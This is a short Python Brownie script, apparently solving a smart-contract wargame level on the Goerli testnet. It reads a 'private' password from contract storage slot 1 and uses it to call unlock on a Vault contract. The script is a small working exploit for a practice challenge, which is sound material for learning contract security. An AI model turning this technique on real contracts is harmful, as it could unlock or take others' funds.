import brownie
from hexbytes import HexBytes

from web3_hacking import config


def main():
    contract_address = "0x0aAd1c2301bc799591e670591C5ea94cCCd61d03"

    brownie.network.disconnect()
    brownie.network.connect("goerli")
    brownie.accounts.add(config.ETH_ACCOUNT_PRIVATE_KEY)

    password_content: HexBytes = brownie.network.web3.eth.get_storage_at(
        contract_address, 1
    )

    password = brownie.network.web3.toText(hexstr=password_content.hex())

    vault = brownie.Vault.at(contract_address)

    tx = vault.unlock(brownie.web3.toHex(text=password), {"from": brownie.accounts[0]})
    tx.wait(1)

    assert vault.locked() is False
